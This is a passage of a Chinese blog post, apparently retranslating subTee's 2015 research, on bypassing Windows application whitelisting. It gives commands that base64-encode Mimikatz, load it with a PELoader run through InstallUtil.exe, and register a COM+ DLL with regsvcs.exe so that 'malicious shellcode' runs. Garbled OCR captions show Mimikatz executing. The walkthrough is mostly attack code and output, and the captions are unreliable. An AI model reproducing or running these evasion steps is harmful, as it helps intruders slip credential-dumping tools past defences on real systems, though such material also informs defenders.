class=&quot;typ&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;UTF8&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContentEncoded &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileContentBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContentEncoded &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileName &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;.b64&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBytes&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(@&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C:\Tools\Mimikatz.exe&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBase64String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;typ&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sw &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(@&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C:\Tools\Mimikatz.b64&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;pln&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;();&lt;/span&gt;</code></pre></div>
+
+<p><span style="font-size:10.5pt">利用同上：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unsafe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\InstallUtil&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;LogToConsole&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;U &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&lt;/span&gt;</code></pre></div>
+
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image0122b446ae6-a163-41b0-83f8-90766d01d629.jpg" alt="说明: 计算机生成了可选文字: C:\Users\pentest\Desktop\more&gt;C:＼讨indo树s\Hicrosoft.NET\Frame讨ork64\v左．0.30319\c
+c.exe/unsafe
+O
+1
+ut:PELoader.exePELoader.cs
+su日IC#2010Compilerversion左．0.30319.1
+icrosoftCorpor日tion．日11rightsreserved.
+../U,U曰
+飞．.1..
+Qn八L
+叮．.1叮．t
+Hicrosoft
+Cop岁right
+C:\Users\pentest\Desktop\more&gt;C:＼讨indo讨s\Hicrosoft.NET\Fr日me讨ork6左＼v左．0.30319\I
+st日1IUtil.exe/10
+1．刀1卫．心
+Q曰C
+叮‘.t叮盯．.
+H1crosoft
+Cop夕right
+.NE
+gfile=/LogToConsole=folse/UPELooder.exe
+TFraoe树orkInstallationutilitvVersion左．0.30319.1
+MicrosoftCorporation．日11rightsreserued二
+PreferredLood日ddress=140000000
+日1locatedSpaceFor63000atIBC60000
+Section.text,CopiedToIBC61000
+Section.rd日ta,CopiedToIBC8E000
+Section.d日t日，CopiedToIBCB7000
+Section.pdata,CopiedToIBCBB000
+Section.rsrc,CopiedToIBCBD000
+Section.reloc,CopiedToIBCC1000
+Delt日＝FFFFFFFEDBC60000
+Loaded日DVRPI32.dll
+LoddedCRVPT32.dll
+Lo日dedcrvptdll.dll
+Lo日dedNET日PI32.dll
+LoadedNTOS日Pl.dll
+LoadedRPCRT4.dll
+Lo日dedSHL讨RPI.dll
+Lo日deds日HLIB.dll
+LoadedSecur32.dll
+LoadedSHELL32.dll
+Lo日dedUSER32.dll
+Lo日dedntdll.dll
+LoadedKERNEL32.dll
+Lo日dedmsvcrt.dll
+ExecutingHimikatz
+.#####.mimikatz2.oalpha(x64)release">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><br></span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><strong><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">0x02 </span></span><span style="font-size:
+10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">利用</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">COM+</span></span></strong><span style="font-size:10.5pt"><strong><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">应用</span></strong><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span style="font-size:10.5pt">把我们的恶意</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">shellcode</span><span style="font-size:10.5pt">写入</span><span lang="EN-US" style="font-size:10.5pt;
+font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">COM+</span><span style="font-size:10.5pt">应用中<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET SDK&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; sn&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;snk&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;EnterpriseServices&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;keyfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;snk &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;library &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Administrator&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\regsvcs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$b &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;New&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ComObject&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bypass&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OR&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;VBScript&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Dim&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; obj &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; obj &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;dllguest.Bypass&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></pre></div>
+
+<p><span style="font-size:10.5pt">使用原作的</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">demo</span><span style="font-size:10.5pt">：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image0149996df9e-a63a-40ea-a02c-014cb8e7760a.jpg" alt="说明: 计算机生成了可选文字: ＿少曰到囚
+编辑汪）帮助以）
+一口l困
+查看仅〕编辑伍〕帮助以〕
+口1整莱口口口‘习到困
+查看汉）编辑但〕帮助以）
+器一
+算一以
+计一看
+属一查
+0
+州州习习习
+引到习习习
+川习习川习
+到到习川到
+到到习曰
+｝习习二
+习州习习习
+到到习习川
+川习习川川
+习习习川国
+习到习曰
+｝习习二
+01习习习到引到
+习习习习习习
+州习到到到习
+州到到到到曰
+。习到习习习l一
+一卜．.......~
+C：劝se护s从pentest从DesktoP勺llore双＞sn
+。exe一kke，。．nk
+洲iCr0S0ft&lt;R&gt;
+Cop夕护ight&lt;c&gt;
+。HETFraoe衬orkStrong
+Hic护。‘oftCorporation
+HaoeUtilit夕
+nllrights
+Uersion3。5。21022。8
+re,erued-
+l(e夕Pai护公护ittentoke夕。snk
+C：劝se护s\Pentest叨esktoP腼ore双＞C：喇indo&quot;s训icrosoft.HFT甲护ane&quot;ork切4。日。3日319嗽s
+c。exe／护：S夕ste。。Fnte护P护i公ese护uices。dll/ke夕file:ke夕。‘nk/target:lib护a护夕／out:dll
+gue">&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span style="font-size:10.5pt">虽然</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">demo</span><span style="font-size:10.5pt">写的不是很完美，测试的时候出了很多错，但已经能够表明作者“利用白名单应用执行恶意代码”的目的。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span style="font-size:10.5pt"><br></span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;"><strong>0x03</strong></span></span><span style="font-size:
+10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;"><strong>原文：</strong></span><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><a href="http://subt0x10.blogspot.com/2015/08/hiding-in-plain-sight-com-surrogate.html" target="_blank" rel="noopener">http://subt0x10.blogspot.com/2015/08/hiding-in-plain-sight-com-surrogate.html</a>&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US"><a href="https://github.com/subTee/ShmooCon-2015" target="_blank" rel="noopener"><span style="font-size:9.5pt;
+font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;background:white">https://github.com/subTee/ShmooCon-2015</span></a>&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<p><span lang="EN-US" style="font-size:
+10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><a href="http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html" target="_blank" rel="noopener">http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html</a>&lt;o:p&gt;&lt;/o:p&gt;</span></p>
+<div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/07/16/e6-88-91-e4-b9-9f-e6-88-90-e4-ba-86-e4-b8-8a-e7-8f-ad-e6-97-8f/" rel="next" title="我也成了上班族">
+                <i class="fa fa-chevron-left"></i> 我也成了上班族
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/09/01/cfml-e4-b8-ad-e7-9a-84scope-injection/" rel="prev" title="CFML中的Scope Injection">
+                CFML中的Scope Injection <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
